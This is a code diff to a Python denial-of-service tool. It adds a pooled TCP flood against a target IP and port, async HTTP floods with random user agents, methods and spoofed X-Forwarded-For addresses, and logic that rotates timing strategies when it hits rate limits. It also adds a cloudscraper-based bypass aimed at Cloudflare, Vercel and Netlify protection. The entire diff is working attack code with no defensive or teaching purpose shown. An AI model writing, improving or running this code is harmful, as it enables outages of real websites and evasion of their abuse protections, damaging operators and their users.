@@ -102,6 +102,143 @@ class AttackResult:
     def requests_per_second(self):
         return self.total_requests / max(1, self.duration())
 
+def enhanced_tcp_flood(target_ip, target_port, duration, result, intensity=50):
+    """Optimized TCP flood with connection pooling"""
+    end_time = time.time() + duration
+    ssl_context = ssl.create_default_context()
+    connection_pool = []
+    
+    # Create initial connection pool
+    for _ in range(intensity):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            if target_port == 443:
+                sock = ssl_context.wrap_socket(sock, server_hostname=target_ip)
+            sock.connect((target_ip, target_port))
+            connection_pool.append(sock)
+        except Exception as e:
+            logger.debug(f"TCP connection failed: {str(e)}")
+            continue
+    
+    while time.time() < end_time and not result.errors > 1000:
+        try:
+            if not connection_pool:
+                # Replenish pool if empty
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                if target_port == 443:
+                    sock = ssl_context.wrap_socket(sock, server_hostname=target_ip)
+                sock.connect((target_ip, target_port))
+                connection_pool.append(sock)
+                
+            sock = random.choice(connection_pool)
+            sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
+            result.tcp_sent += 1
+            time.sleep(0.001)
+        except Exception as e:
+            logger.debug(f"TCP error: {str(e)}")
+            try:
+                sock.close()
+                connection_pool.remove(sock)
+            except:
+                pass
+    
+    # Cleanup
+    for sock in connection_pool:
+        try:
+            sock.close()
+        except:
+            pass
+
+async def send_evasive_request(session, url, result):
+    """Send request with advanced evasion techniques"""
+    try:
+        # Apply current anti-ratelimit strategy
+        if result.current_strategy == 0:
+            await asyncio.sleep(random.uniform(0.01, 0.1))
+        elif result.current_strategy == 1:
+            await asyncio.sleep(random.uniform(0.05, 0.3))
+        
+        # Build headers
+        headers = {
+            "User-Agent": random.choice(USER_AGENTS),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": random.choice(["keep-alive", "close"]),
+            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        }
+
+        # Choose random method
+        method = random.choice(["GET", "POST", "HEAD"])
+        
+        # For POST requests, add random data
+        data = None
+        if method == "POST":
+            data = {"random_data": str(random.randint(1, 100000))}
+            
+        async with session.request(method, url, headers=headers, data=data) as resp:
+            return await handle_response(resp, result)
+                
+    except Exception as e:
+        result.errors += 1
+        logger.debug(f"Request failed: {str(e)}")
+        return False
+
+async def handle_response(response, result):
+    """Process server response"""
+    result.total_requests += 1
+    
+    if response.status == 200:
+        result.successful += 1
+        return True
+    elif response.status in [403, 503, 429, 418]:
+        result.blocked += 1
+        if response.status == 429:
+            result.ratelimit_hits += 1
+            # Rotate strategy when hitting ratelimits
+            result.current_strategy = (result.current_strategy + 1) % 3
+        
+        if any(x in response.headers.get("server", "").lower() for x in ["cloudflare", "vercel", "netlify"]):
+            if await advanced_bypass(str(response.url), result):
+                result.bypassed += 1
+                return True
+    else:
+        result.errors += 1
+    
+    return False
+
+async def advanced_bypass(url, result):
+    """Advanced protection bypass with rotation"""
+    try:
+        result.rotate_techniques()
+        scraper = cloudscraper.create_scraper()
+        
+        # First request
+        resp = scraper.get(url, timeout=REQUEST_TIMEOUT)
+        
+        # If challenged, retry
+        if resp.status_code in [403, 503, 429, 418]:
+            result.challenges += 1
+            resp = scraper.get(url, timeout=REQUEST_TIMEOUT)
+        
+        return resp.status_code == 200
+    
+    except Exception as e:
+        logger.error(f"Bypass failed: {str(e)}")
+        return False
+
+async def attack_worker(session, base_url, port, duration, result):
+    """Optimized attack worker with adaptive techniques"""
+    end_time = time.time() + duration
+    paths = ["/", "/api", "/wp-admin", "/contact", "/blog", "/static/file.js"]
+    
+    while time.time() < end_time and not result.errors > 1000:
+        path = random.choice(paths)
+        target_url = f"{base_url}:{port}{path}" if port not in [80, 443] else f"{base_url}{path}"
+        await send_evasive_request(session, target_url, result)
+
 async def execute_attack_sequence(target_url, port, attack_params, result, attack_id):
     """Execute one attack sequence with given parameters"""
     logger.info(f"Starting attack sequence {attack_id} on {target_url}")
